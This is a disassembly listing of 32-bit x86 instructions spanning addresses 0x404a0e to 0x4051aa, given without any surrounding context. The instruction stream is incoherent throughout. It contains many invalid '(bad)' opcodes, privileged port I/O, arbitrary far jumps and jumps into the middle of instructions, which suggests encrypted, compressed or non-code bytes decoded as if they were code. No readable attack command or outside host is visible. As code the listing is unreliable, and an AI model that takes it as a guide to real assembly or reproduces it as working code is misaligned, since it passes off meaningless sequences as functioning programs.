  404a0e:	addr16 xchg ecx,eax
  404a10:	jmp    0xd0b1:0xd32544cc
  404a17:	jno    0x404a73
  404a19:	mov    ebp,DWORD PTR [ebx+0x39dfb65]
  404a1f:	dec    ebp
  404a20:	sbb    eax,0x41b8b1e3
  404a25:	mov    ebp,0xde6d20a
  404a2a:	and    esp,edi
  404a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a2d:	test   eax,0x140db986
  404a32:	cmp    ebx,DWORD PTR [edi+0x7b]
  404a35:	ja     0x404aa2
  404a37:	cmp    ebp,DWORD PTR [edi]
  404a39:	jge    0x4049c2
  404a3b:	xchg   edx,eax
  404a3c:	mov    edi,0x8df2cc4
  404a41:	pop    esi
  404a42:	test   ebp,edx
  404a44:	nop    DWORD PTR [ebp+0x46]
  404a48:	es in  al,0x90
  404a4b:	mov    esi,0x6e266e1
  404a50:	cmp    DWORD PTR [esi+0xd68026a],esi
  404a56:	mov    esi,0x4b94f63a
  404a5b:	sub    edx,edi
  404a5d:	cdq    
  404a5e:	(bad)  
  404a5f:	pop    DWORD PTR [eax]
  404a61:	pop    esi
  404a62:	pop    ds
  404a63:	sti    
  404a64:	adc    DWORD PTR [ecx],ecx
  404a66:	inc    esp
  404a67:	(bad)  
  404a68:	ror    BYTE PTR [esi-0x30],1
  404a6b:	(bad)  [edx]
  404a6d:	xor    BYTE PTR [esi-0x3b],bh
  404a70:	jo     0x404ada
  404a72:	addr16 mov bl,0x92
  404a75:	aas    
  404a76:	mov    eax,0xa5c0033f
  404a7b:	data16 cmc 
  404a7d:	add    esi,DWORD PTR [ecx-0x16fb0783]
  404a83:	push   edi
  404a84:	inc    DWORD PTR [edi]
  404a86:	jnp    0x404a5f
  404a88:	mov    edx,ds
  404a8a:	scas   eax,DWORD PTR es:[edi]
  404a8b:	and    eax,0xbaf6ebbf
  404a90:	mov    ebx,0x34eea587
  404a95:	mov    esi,0x2178e0f6
  404a9a:	cmp    DWORD PTR [ebx],ebp
  404a9c:	cmp    al,0x64
  404a9e:	fsubr  DWORD PTR [eax+0x2b2d7a8d]
  404aa4:	inc    ecx
  404aa5:	lahf   
  404aa6:	pop    esp
  404aa7:	jmp    0x8ca1:0x67c45aa2
  404aae:	mov    ch,0x18
  404ab0:	pop    ss
  404ab1:	in     al,0x4e
  404ab3:	lods   eax,DWORD PTR ds:[esi]
  404ab4:	jne    0x404a6e
  404ab6:	cmc    
  404ab7:	push   0x74
  404ab9:	stc    
  404aba:	ret    
  404abb:	outs   dx,BYTE PTR ds:[esi]
  404abc:	inc    edi
  404abd:	out    dx,eax
  404abe:	or     BYTE PTR [ebx-0x25],dl
  404ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ac2:	ins    BYTE PTR es:[edi],dx
  404ac3:	ds xchg edx,eax
  404ac5:	in     eax,dx
  404ac6:	fwait
  404ac7:	mov    ah,0x92
  404ac9:	jecxz  0x404a88
  404acb:	xlat   BYTE PTR ds:[ebx]
  404acc:	fimul  WORD PTR [ebp-0x55]
  404acf:	add    dl,BYTE PTR [edx-0x7]
  404ad2:	std    
  404ad3:	cli    
  404ad4:	out    dx,al
  404ad5:	pop    ss
  404ad6:	push   es
  404ad7:	retf   
  404ad8:	and    DWORD PTR [ebp-0x361513a9],eax
  404ade:	xor    al,0xf1
  404ae0:	xor    al,0x89
  404ae2:	outs   dx,DWORD PTR ds:[esi]
  404ae3:	ret    
  404ae4:	and    al,0xe0
  404ae6:	mov    ds:0xfc0c9bd0,eax
  404aeb:	cmp    ebx,DWORD PTR [ebx+0x6]
  404aee:	add    BYTE PTR [edx+0x6cb082ac],dl
  404af4:	fstp   DWORD PTR [ecx-0x5c]
  404af7:	mov    ecx,0x74bf3e3d
  404afc:	push   0x7a40c4cd
  404b01:	ret    
  404b02:	xchg   DWORD PTR [eax-0x5375db8d],ebp
  404b08:	adc    DWORD PTR [ebp+0x52ef6956],esi
  404b0e:	scas   al,BYTE PTR es:[edi]
  404b0f:	ret    0x73a4
  404b12:	and    ecx,DWORD PTR [edi+0x68]
  404b15:	fsub   QWORD PTR [edx-0x46]
  404b18:	stos   DWORD PTR es:[edi],eax
  404b19:	int3   
  404b1a:	aam    0x3f
  404b1c:	sbb    al,0xc9
  404b1e:	cmp    BYTE PTR [ecx-0x73556987],bl
  404b24:	and    al,0x47
  404b26:	cmp    BYTE PTR [ecx-0x6f],dh
  404b29:	sbb    al,0xb3
  404b2b:	ins    DWORD PTR es:[edi],dx
  404b2c:	cvtpi2ps xmm1,QWORD PTR ds:0x8d3951f8
  404b33:	adc    esi,DWORD PTR [esi+0x31]
  404b36:	std    
  404b37:	out    dx,al
  404b38:	adc    DWORD PTR [ebx-0x7d1677b0],edi
  404b3e:	xor    al,0xe8
  404b40:	sub    al,0xf6
  404b42:	jle    0x404ac4
  404b44:	jne    0x404b08
  404b46:	sahf   
  404b47:	fst    DWORD PTR [eax]
  404b49:	sub    ebp,DWORD PTR [ebp-0x204cd10e]
  404b4f:	addr16 aas 
  404b51:	jge    0x404b98
  404b53:	stc    
  404b54:	jmp    0x6a14acb3
  404b59:	imul   ecx,DWORD PTR [ebx],0xffffff95
  404b5c:	mov    eax,0x7bdf4e18
  404b61:	mov    DWORD PTR [esi+0x7],0xea91a2df
  404b68:	loopne 0x404b6d
  404b6a:	loopne 0x404b1e
  404b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b6d:	outs   dx,BYTE PTR ds:[esi]
  404b6e:	push   eax
  404b6f:	lods   al,BYTE PTR ds:[esi]
  404b70:	inc    ebp
  404b71:	cmp    ch,bh
  404b73:	aam    0xa2
  404b75:	adc    BYTE PTR fs:[ebx-0x30],ch
  404b79:	ret    
  404b7a:	icebp  
  404b7b:	cmp    eax,ebp
  404b7d:	pop    ds
  404b7e:	aam    0xff
  404b80:	shl    DWORD PTR [edx-0x10],1
  404b83:	cmp    esi,edx
  404b85:	dec    edi
  404b86:	arpl   WORD PTR [esi],bp
  404b88:	out    0x6f,eax
  404b8a:	jns    0x404b7d
  404b8c:	jmp    DWORD PTR [edi-0xa6d1791]
  404b92:	fnstcw WORD PTR [eax+0x7efe853]
  404b98:	cs xchg edx,eax
  404b9a:	loop   0x404bc0
  404b9c:	fdiv   DWORD PTR [esi-0x3915a7b3]
  404ba2:	sahf   
  404ba3:	lods   al,BYTE PTR ds:[esi]
  404ba4:	add    DWORD PTR [ebp+0x15],esi
  404ba7:	cmp    DWORD PTR [ebp-0x20],esp
  404baa:	sbb    eax,0xc6a24637
  404baf:	inc    esi
  404bb0:	or     BYTE PTR [eax],ch
  404bb2:	aad    0x4b
  404bb4:	lahf   
  404bb5:	dec    edx
  404bb6:	mov    cl,0x47
  404bb8:	xor    eax,0xe6324b70
  404bbd:	(bad)  
  404bbe:	ficomp WORD PTR [ecx]
  404bc0:	not    DWORD PTR [ebp+ebx*1-0x6a]
  404bc4:	mov    dl,0x6c
  404bc6:	out    dx,eax
  404bc7:	mov    ebx,edi
  404bc9:	xchg   esp,eax
  404bca:	iret   
  404bcb:	add    DWORD PTR [ebp+eiz*8-0x1a],edx
  404bcf:	lods   al,BYTE PTR ds:[esi]
  404bd0:	xor    edx,DWORD PTR [eax+ebx*4-0x79]
  404bd4:	daa    
  404bd5:	imul   ebx,DWORD PTR [ebp+ecx*2-0x2a],0x60
  404bda:	nop    edi
  404bdd:	mov    bl,0x38
  404bdf:	and    al,0xb5
  404be1:	ffree  st(4)
  404be3:	push   ebp
  404be4:	sar    DWORD PTR [edx+0x33e43741],cl
  404bea:	mov    WORD PTR ds:0xf16ee67,cs
  404bf0:	mov    eax,0xd86a6a5d
  404bf5:	pop    ebp
  404bf6:	stos   BYTE PTR es:[edi],al
  404bf7:	jo     0x404c2c
  404bf9:	pop    ds
  404bfa:	jb     0x404bb5
  404bfc:	je     0x404c6b
  404bfe:	pop    edx
  404bff:	adc    DWORD PTR [esi+0x31dbd43d],eax
  404c05:	adc    al,0x9f
  404c07:	scas   al,BYTE PTR es:[edi]
  404c08:	lds    ecx,FWORD PTR [ebx-0x4b0e6099]
  404c0e:	and    al,0xf6
  404c10:	daa    
  404c11:	repz scas al,BYTE PTR es:[edi]
  404c13:	xchg   ebx,eax
  404c14:	inc    edx
  404c15:	fist   WORD PTR [eax+0x77]
  404c18:	jb     0x404c26
  404c1a:	mov    ch,BYTE PTR ss:[edi-0xf]
  404c1e:	xor    eax,0x55fb6f41
  404c23:	mov    al,ds:0x3aadc189
  404c28:	cmp    DWORD PTR [esi+0x26ec7873],edi
  404c2e:	xor    ebp,DWORD PTR [esi]
  404c30:	xor    esi,eax
  404c32:	add    eax,0x161c9bd6
  404c37:	mov    bh,0x63
  404c39:	jmp    0x404c83
  404c3b:	stos   DWORD PTR es:[edi],eax
  404c3c:	mov    edi,0x9ea2cdd5
  404c41:	lds    ebx,FWORD PTR [ebx+edi*1]
  404c44:	loopne 0x404c81
  404c46:	mov    BYTE PTR [esi+0x20],ch
  404c49:	push   esp
  404c4a:	mov    WORD PTR [ecx-0x5b],?
  404c4d:	pusha  
  404c4e:	pop    eax
  404c4f:	dec    ebp
  404c50:	loop   0x404c86
  404c52:	jbe    0x404ca8
  404c54:	dec    edi
  404c55:	outs   dx,BYTE PTR ds:[esi]
  404c56:	push   esi
  404c57:	pushf  
  404c58:	adc    eax,0x4b61fd50
  404c5d:	out    0x82,al
  404c5f:	mov    al,0xc1
  404c61:	jb     0x404c8c
  404c63:	inc    eax
  404c64:	jae    0x404c61
  404c66:	mov    ecx,0x40f4fabe
  404c6b:	inc    ecx
  404c6d:	scas   eax,DWORD PTR es:[edi]
  404c6e:	popf   
  404c6f:	cmc    
  404c70:	pop    esi
  404c71:	in     al,0x64
  404c73:	cwde   
  404c74:	test   BYTE PTR [edi-0x10ee8713],ch
  404c7a:	xchg   esp,eax
  404c7b:	sub    dl,bh
  404c7d:	or     DWORD PTR [edi+0x2c],eax
  404c80:	jne    0x404c37
  404c82:	inc    eax
  404c83:	inc    ebp
  404c84:	cmp    ecx,DWORD PTR [ebx-0x56]
  404c87:	sbb    eax,0xf1135947
  404c8c:	dec    eax
  404c8d:	sahf   
  404c8e:	and    al,0xfa
  404c90:	pop    eax
  404c91:	and    al,0x5e
  404c93:	test   al,0xf7
  404c95:	sti    
  404c96:	mov    BYTE PTR [edx-0x6a],0x20
  404c9a:	inc    ebx
  404c9b:	shl    DWORD PTR [eax+eiz*8-0x372f7dfa],0x66
  404ca3:	push   0xf1a7cafe
  404ca8:	push   ss
  404ca9:	aam    0xd0
  404cab:	push   cs
  404cac:	pop    ss
  404cad:	call   0xdef646c4
  404cb2:	lods   al,BYTE PTR ds:[esi]
  404cb3:	into   
  404cb4:	mov    ebx,gs
  404cb6:	mov    ds:0x29926d1c,al
  404cbb:	inc    edx
  404cbc:	cmp    edi,DWORD PTR [edx+0x177becd2]
  404cc2:	dec    edx
  404cc3:	inc    eax
  404cc4:	mov    ah,0x91
  404cc6:	sahf   
  404cc7:	retf   
  404cc8:	mov    esp,0xb7d7d964
  404ccd:	scas   eax,DWORD PTR es:[edi]
  404cce:	add    edx,DWORD PTR [ebp+0x42]
  404cd1:	ins    BYTE PTR es:[edi],dx
  404cd2:	mov    dl,0x67
  404cd4:	mov    al,ds:0xe3026f2d
  404cd9:	lock into 
  404cdb:	jmp    0x14a1:0x2c226eeb
  404ce2:	inc    esp
  404ce3:	pop    edx
  404ce4:	cwde   
  404ce5:	and    DWORD PTR [esi+0x17],ecx
  404ce8:	jle    0x404d61
  404cea:	scas   eax,DWORD PTR es:[edi]
  404ceb:	inc    ebp
  404cec:	pop    eax
  404ced:	or     eax,0x7907bac6
  404cf2:	cmc    
  404cf3:	loop   0x404d06
  404cf5:	or     esp,eax
  404cf7:	rcl    DWORD PTR [ebp-0x46466a07],0x1d
  404cfe:	rol    DWORD PTR [ebx+edi*8],1
  404d01:	test   DWORD PTR [edi+0x78854fe3],0x5c313a41
  404d0b:	push   ds
  404d0c:	into   
  404d0d:	push   0xdfb4b213
  404d12:	imul   edi,ebp,0x71
  404d15:	or     dl,BYTE PTR [esi-0xf715e64]
  404d1b:	push   ebx
  404d1c:	jmp    0x2ebf51f4
  404d21:	dec    ecx
  404d22:	jae    0x404cdf
  404d24:	test   al,0x1c
  404d26:	fwait
  404d27:	int    0x3
  404d29:	shl    BYTE PTR [ebx],1
  404d2b:	enter  0x71bd,0x52
  404d2f:	dec    edx
  404d30:	adc    bh,BYTE PTR [ecx+0xe]
  404d33:	stos   BYTE PTR es:[edi],al
  404d34:	mov    cl,0x6
  404d36:	repnz mov esp,DWORD PTR [edx]
  404d39:	loope  0x404d67
  404d3b:	jmp    0xde774995
  404d40:	int3   
  404d41:	jne    0x404da2
  404d43:	inc    edx
  404d44:	mul    edx
  404d46:	and    al,0xa9
  404d48:	xor    bh,bh
  404d4a:	push   edi
  404d4b:	xchg   DWORD PTR [esi],ebx
  404d4d:	push   0x3f636116
  404d52:	neg    DWORD PTR [esi+eiz*8-0x702ca8f5]
  404d59:	jbe    0x404d7c
  404d5b:	jmp    0xe867:0x7690559b
  404d62:	push   ss
  404d63:	ss mov eax,0x31b0832a
  404d69:	xor    DWORD PTR ds:0x53113912,0x9c0bb99a
  404d73:	adc    al,0x66
  404d75:	adc    DWORD PTR [edx],ecx
  404d77:	fistp  QWORD PTR [eax]
  404d79:	out    0x1e,eax
  404d7b:	dec    edx
  404d7c:	out    dx,al
  404d7d:	xor    al,0x8f
  404d7f:	aad    0xb1
  404d81:	gs fcmovbe st,st(0)
  404d84:	pop    edx
  404d85:	mov    eax,0x2e2ee6f9
  404d8a:	clc    
  404d8b:	push   es
  404d8c:	iret   
  404d8d:	out    0x25,al
  404d8f:	test   eax,0xbb3b69e3
  404d94:	xor    al,0xc7
  404d96:	xor    DWORD PTR [ebp+0x69b6c2aa],ebx
  404d9c:	pop    ebp
  404d9d:	push   0xffffff80
  404d9f:	and    DWORD PTR [esi+0x64],edi
  404da2:	dec    ecx
  404da3:	ins    BYTE PTR es:[edi],dx
  404da4:	repz jmp 0xa19b01e3
  404daa:	mov    eax,0x7af57bb5
  404daf:	xchg   DWORD PTR [eax-0x29],esi
  404db2:	clc    
  404db3:	or     cl,ch
  404db5:	push   edx
  404db6:	(bad)  
  404db7:	leave  
  404db8:	jb     0x404d70
  404dba:	jo     0x404e32
  404dbc:	xchg   ebx,eax
  404dbd:	cmp    al,0x5
  404dbf:	adc    BYTE PTR [eax-0x163b3c6c],al
  404dc5:	mov    ebp,0xec658e52
  404dca:	jp     0x404dc2
  404dcc:	mov    al,ds:0xc794cd4e
  404dd1:	xchg   edx,eax
  404dd2:	and    ah,cl
  404dd4:	xchg   edi,eax
  404dd6:	mov    ds:0xbe77cf48,eax
  404ddb:	test   eax,0x9ce2763c
  404de0:	cdq    
  404de1:	add    BYTE PTR [ebp+esi*4+0x403e8910],0xf
  404de9:	lahf   
  404dea:	cmp    edi,DWORD PTR [esi+0x6b]
  404ded:	addr16 imul esi,edx,0x78cadb94
  404df4:	out    dx,eax
  404df5:	pop    ebp
  404df6:	stos   DWORD PTR es:[edi],eax
  404df7:	xchg   BYTE PTR [edx],dl
  404df9:	lock xor BYTE PTR [edi-0x4bb94207],al
  404e00:	sub    al,0x3c
  404e02:	push   DWORD PTR [esi-0xaba1b23]
  404e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e09:	and    al,0x1
  404e0b:	in     eax,dx
  404e0c:	and    bl,BYTE PTR [edx+0x12]
  404e0f:	cmp    eax,0xdd265fcd
  404e14:	repz in eax,dx
  404e16:	dec    ebx
  404e17:	dec    ecx
  404e18:	call   DWORD PTR [ecx+ecx*1]
  404e1b:	js     0x404ddd
  404e1d:	aaa    
  404e1e:	and    esp,DWORD PTR [edx-0x61157f35]
  404e24:	ins    DWORD PTR es:[edi],dx
  404e25:	mov    DWORD PTR [eax+0x49],edx
  404e28:	nop
  404e29:	dec    esp
  404e2a:	ins    BYTE PTR es:[edi],dx
  404e2b:	in     eax,dx
  404e2c:	(bad)  
  404e2d:	loopne 0x404dd4
  404e2f:	lods   eax,DWORD PTR ds:[esi]
  404e30:	stos   DWORD PTR es:[edi],eax
  404e31:	mov    ds:0x4504f077,eax
  404e36:	in     eax,0xc
  404e38:	or     edi,ecx
  404e3a:	aad    0xf9
  404e3c:	scas   al,BYTE PTR es:[edi]
  404e3d:	push   esi
  404e3e:	jb     0x404e34
  404e40:	push   edx
  404e41:	cmp    ebp,DWORD PTR [edx+esi*2+0x3ee7a9e4]
  404e48:	jb     0x404df1
  404e4a:	add    al,0x6c
  404e4c:	enter  0xbbe5,0xe8
  404e50:	push   esp
  404e51:	xchg   edx,eax
  404e52:	mov    dh,0xb3
  404e54:	jne    0x404ea8
  404e56:	dec    ecx
  404e57:	mov    ecx,DWORD PTR [edx]
  404e59:	jmp    0x945de0c1
  404e5e:	fiadd  DWORD PTR [edi]
  404e60:	fnstsw WORD PTR gs:0x469e9eaf
  404e67:	xor    eax,DWORD PTR [ebp+0x18]
  404e6a:	fild   DWORD PTR [ebx-0x49]
  404e6d:	test   ebx,0xf7ee8798
  404e73:	sub    al,0xeb
  404e75:	dec    esp
  404e76:	mov    ds:0x878c1562,eax
  404e7b:	jmp    0x404e84
  404e7d:	mov    BYTE PTR [ebx+0x3b],0xbd
  404e81:	scas   eax,DWORD PTR es:[edi]
  404e82:	(bad)  
  404e83:	out    dx,eax
  404e84:	or     BYTE PTR [ebx-0x1bfd99dd],al
  404e8a:	xlat   BYTE PTR ds:[ebx]
  404e8b:	or     BYTE PTR [esi-0x7],0x28
  404e8f:	add    bh,BYTE PTR [ecx-0x62895bee]
  404e95:	mov    ebp,0x5252873a
  404e9a:	adc    al,0x33
  404e9c:	fdiv   st(5),st
  404e9e:	mov    BYTE PTR [ecx+0x49],bl
  404ea1:	mov    dh,0x12
  404ea3:	mov    eax,ds:0x3aabf795
  404ea8:	loope  0x404ede
  404eaa:	popa   
  404eab:	cdq    
  404eac:	jbe    0x404e5d
  404eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eaf:	xor    DWORD PTR [esi],esi
  404eb1:	inc    ebp
  404eb2:	retf   
  404eb3:	loopne 0x404eff
  404eb5:	mov    ebx,esp
  404eb7:	icebp  
  404eb8:	inc    eax
  404eb9:	cwde   
  404eba:	add    DWORD PTR [ecx+0x7a],esp
  404ebd:	xchg   esp,eax
  404ebe:	daa    
  404ebf:	adc    eax,0x5b531a9b
  404ec4:	sbb    ebp,ebx
  404ec6:	ficomp DWORD PTR [esp+esi*4]
  404ec9:	(bad)  
  404eca:	push   cs
  404ecb:	xlat   BYTE PTR ds:[ebx]
  404ecc:	rcr    DWORD PTR [edx+edx*4],0x92
  404ed0:	cmc    
  404ed1:	dec    edx
  404ed2:	mov    dh,0x51
  404ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ed5:	mov    dl,0x27
  404ed7:	mov    edi,0xf90401e5
  404edc:	movsx  ecx,WORD PTR [edx-0x61adf148]
  404ee3:	jb     0x404ef4
  404ee5:	cmp    al,0x5c
  404ee7:	sbb    al,BYTE PTR [edi]
  404ee9:	loope  0x404ec2
  404eeb:	and    esp,ebx
  404eed:	sub    ebp,ecx
  404eef:	xor    ebp,0x7ac0c695
  404ef5:	jl     0x404f2c
  404ef7:	mov    DWORD PTR [eax+eax*4-0x6f],ebx
  404efb:	or     BYTE PTR [esi+0x37f2a1e1],dh
  404f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f02:	sub    BYTE PTR [ebp+0x45],dh
  404f05:	aad    0x55
  404f07:	pusha  
  404f08:	fmul   DWORD PTR [edx-0x2e]
  404f0b:	(bad)  
  404f0d:	shr    DWORD PTR [esi],cl
  404f0f:	mov    ch,0x8f
  404f11:	cs popa 
  404f13:	bound  esi,QWORD PTR [edi-0x2d245130]
  404f19:	cmp    eax,0xbf23fe4e
  404f1e:	cmp    edi,ebp
  404f20:	jge    0x404f85
  404f22:	fild   DWORD PTR [edx]
  404f24:	sub    eax,0x97c8a8f5
  404f29:	outs   dx,BYTE PTR ds:[esi]
  404f2a:	xchg   BYTE PTR [ecx+ecx*1-0x5a38743f],ch
  404f31:	es std 
  404f33:	push   edi
  404f34:	test   DWORD PTR [ebp+0x59],ebx
  404f37:	sub    al,0x79
  404f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f3a:	jmp    0x58ead025
  404f3f:	inc    ebx
  404f40:	scas   eax,DWORD PTR es:[edi]
  404f41:	mov    ebx,0xe80f73b5
  404f46:	xchg   DWORD PTR [ecx-0x34],ebp
  404f49:	aad    0x37
  404f4b:	inc    cx
  404f4d:	jo     0x404f36
  404f4f:	(bad)  
  404f50:	cmp    eax,0x4800c1ff
  404f55:	inc    esi
  404f56:	xchg   BYTE PTR [eax-0x18],dh
  404f59:	inc    ecx
  404f5a:	xor    DWORD PTR [ebx+0x733f1a5c],ebp
  404f60:	(bad)  
  404f61:	jl     0x404fb0
  404f63:	pop    esi
  404f64:	inc    esi
  404f65:	ja     0x404f74
  404f67:	shr    DWORD PTR [edi+edx*4+0x31],1
  404f6b:	push   ebp
  404f6c:	dec    ecx
  404f6d:	adc    al,0x5d
  404f6f:	fld    TBYTE PTR [ecx]
  404f71:	imul   esi,ebp,0x9117071c
  404f77:	fsub   st,st(2)
  404f79:	inc    edi
  404f7a:	aad    0x38
  404f7c:	add    edi,DWORD PTR [esi+0x3d]
  404f7f:	leave  
  404f80:	ret    0x7272
  404f83:	jno    0x404f0e
  404f85:	test   eax,esi
  404f87:	cmp    eax,0x88448153
  404f8c:	setl   BYTE PTR [ecx+0x25d9e6c5]
  404f93:	and    bl,ch
  404f95:	sbb    al,0x4f
  404f97:	add    bl,BYTE PTR [ecx-0x52]
  404f9a:	aaa    
  404f9b:	(bad)  
  404f9d:	(bad)  
  404f9e:	push   esp
  404f9f:	sbb    cl,BYTE PTR [ecx-0x1e53e593]
  404fa5:	add    dh,BYTE PTR [edi-0x31db7fe9]
  404fab:	inc    ebp
  404fac:	shl    BYTE PTR [eax-0x43],0xdb
  404fb0:	xor    DWORD PTR [ecx+ebx*1],0x1a
  404fb4:	add    DWORD PTR [edi+0x75],ecx
  404fb7:	adc    edx,DWORD PTR [edi]
  404fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fba:	clc    
  404fbb:	out    0x7a,eax
  404fbd:	add    BYTE PTR [esi-0x2c],bh
  404fc0:	jbe    0x404fbd
  404fc2:	or     dh,bl
  404fc4:	jg     0x40500f
  404fc6:	push   ss
  404fc7:	mov    eax,0xa02fb733
  404fcc:	dec    edx
  404fcd:	test   al,0x8
  404fcf:	sbb    eax,0x380cf316
  404fd4:	js     0x404fda
  404fd6:	and    esp,ebx
  404fd8:	cmp    ah,al
  404fda:	shl    bh,1
  404fdc:	ins    BYTE PTR es:[edi],dx
  404fdd:	sbb    eax,0x28877744
  404fe2:	jbe    0x404f6f
  404fe4:	mov    edi,0xaa925076
  404fe9:	mov    ds:0xa5464cd8,al
  404fee:	arpl   WORD PTR [edx],ax
  404ff0:	sti    
  404ff1:	(bad)  
  404ff2:	xor    dl,BYTE PTR [ecx-0x335dc4ca]
  404ff8:	js     0x40504f
  404ffa:	cmp    bh,ch
  404ffc:	ret    
  404ffd:	cli    
  404ffe:	or     DWORD PTR [ecx+0x766c1044],ebp
  405004:	into   
  405005:	jae    0x40504c
  405007:	mov    edx,0x323d9e64
  40500c:	daa    
  40500d:	cmp    BYTE PTR [edx+0x745cbbdf],cl
  405013:	mov    ecx,0x764e2414
  405018:	push   cs
  405019:	and    DWORD PTR [ebp+eiz*8-0x2d],ebp
  40501d:	in     al,dx
  40501e:	rcl    BYTE PTR [ebx+0x3b00d51d],1
  405024:	xchg   edi,eax
  405025:	push   cs
  405026:	or     DWORD PTR [edx+eiz*4],ebp
  405029:	stos   DWORD PTR es:[edi],eax
  40502a:	pop    ebp
  40502b:	xchg   DWORD PTR [edx],edi
  40502d:	sti    
  40502e:	lea    ecx,[esi]
  405030:	adc    eax,0x6ce00616
  405035:	sub    ebx,DWORD PTR [ebx]
  405037:	repz aaa 
  405039:	stc    
  40503a:	stos   BYTE PTR es:[edi],al
  40503b:	xor    edi,DWORD PTR [eax+0x11]
  40503e:	das    
  40503f:	fdivr  QWORD PTR [eax]
  405041:	push   edi
  405042:	pop    ss
  405043:	mov    ds:0xf271e603,al
  405048:	outs   dx,DWORD PTR ds:[esi]
  405049:	sar    DWORD PTR [ecx-0x7b],0xf9
  40504d:	inc    esi
  40504e:	popf   
  40504f:	in     al,0x70
  405051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405052:	lahf   
  405053:	and    eax,0x67ca2e44
  405058:	sub    eax,0xf236a98c
  40505d:	dec    esi
  40505e:	jne    0x405014
  405060:	mov    ds:0xd6e3de4,eax
  405065:	and    eax,0x42a7b278
  40506a:	xor    al,0xa
  40506c:	adc    ch,BYTE PTR [edi]
  40506e:	stc    
  40506f:	mov    bl,0xb6
  405071:	or     BYTE PTR [eax+ecx*4],dh
  405074:	push   esi
  405075:	das    
  405076:	and    ah,BYTE PTR [edx+0xc]
  405079:	or     BYTE PTR [ebx],0x7a
  40507c:	inc    esi
  40507d:	inc    ebp
  40507e:	bound  esp,QWORD PTR [edi-0x22f7b235]
  405084:	mov    eax,ebp
  405086:	int    0x82
  405088:	push   edi
  405089:	push   es
  40508a:	mov    ds:0x470c9f30,eax
  40508f:	cmp    DWORD PTR [ecx],0xecf59ca2
  405095:	(bad)  
  405096:	data16 (bad) 
  405099:	pop    ebx
  40509a:	mov    ah,0xb
  40509c:	fadd   st(0),st
  40509e:	hlt    
  40509f:	fidivr DWORD PTR [edx+0x3104006d]
  4050a5:	in     eax,0x48
  4050a7:	xor    ecx,DWORD PTR [esi+0x1f]
  4050aa:	push   edx
  4050ab:	out    dx,eax
  4050ac:	or     ah,BYTE PTR [ecx+0x6d]
  4050af:	sub    ebp,esi
  4050b1:	dec    eax
  4050b2:	test   ah,bl
  4050b4:	sub    al,0x13
  4050b6:	jns    0x40503c
  4050b8:	inc    ebp
  4050b9:	es popf 
  4050bb:	xor    al,0xf6
  4050bd:	adc    ebx,ebp
  4050bf:	lds    eax,FWORD PTR [ebx+0x76ef8ee5]
  4050c5:	ja     0x4050ad
  4050c7:	pop    ds
  4050c8:	mov    DWORD PTR [esi],ebp
  4050ca:	psubusw mm4,QWORD PTR [ebx]
  4050cd:	inc    edx
  4050ce:	addr16 pop ss
  4050d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050d1:	lahf   
  4050d2:	scas   al,BYTE PTR es:[edi]
  4050d3:	js     0x4050f9
  4050d5:	dec    ecx
  4050d6:	or     eax,0x553b1f34
  4050db:	cld    
  4050dc:	or     al,0xa9
  4050de:	cmp    bh,ch
  4050e0:	ror    BYTE PTR [ebx+0x4c],1
  4050e3:	mov    al,0xe5
  4050e5:	rcr    BYTE PTR [esi],1
  4050e7:	in     eax,0x72
  4050e9:	into   
  4050ea:	ja     0x405087
  4050ec:	xor    eax,0x5077a2fe
  4050f1:	inc    ecx
  4050f2:	pusha  
  4050f3:	push   eax
  4050f4:	adc    cl,0x71
  4050f7:	in     eax,dx
  4050f8:	pop    edx
  4050f9:	and    eax,DWORD PTR [eax+0x5f]
  4050fc:	pop    es
  4050fd:	add    eax,0xffea1cac
  405102:	ret    
  405103:	sub    al,0x7c
  405105:	out    dx,al
  405106:	js     0x4050f5
  405108:	mov    edi,0x88d720af
  40510d:	add    edx,DWORD PTR [ecx-0x67]
  405110:	jno    0x405097
  405112:	xchg   esi,eax
  405113:	pop    ebp
  405114:	ja     0x405153
  405116:	enter  0x6a53,0xeb
  40511a:	sbb    DWORD PTR [ecx],esp
  40511c:	xchg   DWORD PTR [eax+0x6d],ebp
  40511f:	mov    ecx,0x8c148ed8
  405124:	aas    
  405125:	mov    eax,0xb3bac1ff
  40512a:	pusha  
  40512b:	shl    ch,cl
  40512d:	add    eax,0xff474d23
  405132:	scas   al,BYTE PTR es:[edi]
  405133:	dec    edi
  405134:	les    eax,FWORD PTR [ebp-0x12]
  405137:	pop    eax
  405138:	ins    BYTE PTR es:[edi],dx
  405139:	and    al,0x71
  40513b:	icebp  
  40513c:	aam    0x65
  40513e:	sub    ebp,0x327094fc
  405144:	cmp    DWORD PTR [edi-0x3d172d2a],edx
  40514a:	ror    BYTE PTR [esi-0x2dd6e667],cl
  405150:	aam    0x9
  405152:	enter  0x495d,0x9f
  405156:	mov    bh,0x71
  405158:	xchg   edi,eax
  405159:	xchg   BYTE PTR [ecx-0xf],al
  40515c:	adc    BYTE PTR [edx+edi*8-0x21131b54],dh
  405163:	fstp   QWORD PTR [eax+0x465f9380]
  405169:	fld    DWORD PTR [eax+0x74128fa2]
  40516f:	sbb    cl,BYTE PTR [esi]
  405171:	xlat   BYTE PTR ds:[ebx]
  405172:	fwait
  405173:	sub    DWORD PTR [esi-0x50],0xffffff85
  405177:	rol    ch,cl
  405179:	mov    al,0xd0
  40517b:	xchg   esp,eax
  40517c:	jecxz  0x405128
  40517e:	pop    eax
  40517f:	or     eax,0x11bb5180
  405184:	in     eax,dx
  405185:	ss mov esp,0x394bd5ba
  40518b:	clc    
  40518c:	stos   BYTE PTR es:[edi],al
  40518d:	push   esp
  40518e:	push   ebx
  40518f:	fidiv  WORD PTR [ecx-0xf0f3a5b]
  405195:	or     eax,0xe946eeea
  40519a:	imul   esi,DWORD PTR [eax+0x4043b22b],0xd5c02610
  4051a4:	sbb    eax,0xeb87a750
  4051a9:	dec    ebp
  4051aa:	pop    edi
